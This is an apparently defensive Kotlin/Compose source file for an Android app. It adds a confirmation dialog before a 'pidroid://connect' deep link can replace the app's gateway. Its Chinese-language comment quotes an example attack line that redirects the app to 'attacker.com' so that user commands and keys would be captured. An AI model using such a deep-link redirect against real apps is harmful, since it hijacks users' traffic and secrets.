package com.pi.app.ui.settings

import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.selection.SelectionContainer
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.pi.app.ui.theme.LocalAppTheme

/**
 * `pidroid://connect?url=…&token=…` 的落地确认弹窗。
 *
 * 为什么必须有：这个 scheme 在清单里是 `BROWSABLE` 的，任何网页一句
 * `location.href = "pidroid://connect?url=https://attacker.com&token=x"` 就能把 App 唤起。
 * 旧实现 ping 通就直接 `saveConnection`，等于让一个**陌生页面**在不问用户一句的情况下
 * 把当前网关换掉——之后用户发给 Agent 的每一条指令（含工作区路径、代码、私钥）都会
 * 发往攻击者服务器。所以这里必须显式展示目标地址，由用户手动确认后才落盘。
 *
 * 展示上刻意把完整 URL 放出来并允许选中：用户真正需要核对的是 host，而不是设备别名
 * （别名是对方随便填的，`name=我的 MacBook` 不代表任何东西）。
 *
 * 这里不提供“连接中”状态：确认后立即关窗、走与扫码/手动配置完全相同的
 * `connectToServer`（ping 成功后才会落盘），失败只会弹一条错误提示，
 * 三处入口的失败语义因此保持一致。
 */
@Composable
fun ConnectLinkConfirmDialog(
    targetName: String,
    targetUrl: String,
    onConfirm: () -> Unit,
    onDismiss: () -> Unit
) {
    val theme = LocalAppTheme.current

    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = theme.surfaceContainerLow,
        titleContentColor = theme.textPrimary,
        textContentColor = theme.textSecondary,
        shape = RoundedCornerShape(14.dp),
        title = {
            Text(
                text = "确认连接这台设备？",
                fontWeight = FontWeight.Bold,
                color = theme.textPrimary
            )
        },
        text = {
            Column(
                modifier = Modifier.fillMaxWidth(),
                verticalArrangement = Arrangement.spacedBy(10.dp)
            ) {
                // 不写会造成不可逆损失 / 方向性错误：换绑即丢弃当前网关，且对方能读写本机文件
                Text(
                    text = "链接来自外部页面。确认后当前网关会被替换，之后的指令都发往该地址。",
                    fontSize = 12.sp,
                    lineHeight = 17.sp,
                    color = theme.textSecondary
                )
                Text(
                    text = "设备：${targetName.take(MAX_LABEL_CHARS)}",
                    fontSize = 12.sp,
                    color = theme.textPrimary,
                    maxLines = 1,
                    overflow = TextOverflow.Ellipsis
                )
                SelectionContainer {
                    Text(
                        text = targetUrl.take(MAX_URL_CHARS),
                        fontSize = 11.sp,
                        lineHeight = 16.sp,
                        fontFamily = FontFamily.Monospace,
                        color = theme.primary,
                        maxLines = 3,
                        overflow = TextOverflow.Ellipsis
                    )
                }
            }
        },
        confirmButton = {
            Button(
                onClick = onConfirm,
                colors = ButtonDefaults.buttonColors(containerColor = theme.primary),
                shape = RoundedCornerShape(8.dp)
            ) {
                Text("连接")
            }
        },
        dismissButton = {
            TextButton(onClick = onDismiss) {
                Text("取消", color = theme.textSecondary)
            }
        }
    )
}

/** 别名是对方随便填的，截断只为不让它把弹窗撑爆。 */
private const val MAX_LABEL_CHARS = 40

/** URL 展示上限：真实网关地址远短于此，超出必然是构造出来的垃圾。 */
private const val MAX_URL_CHARS = 200
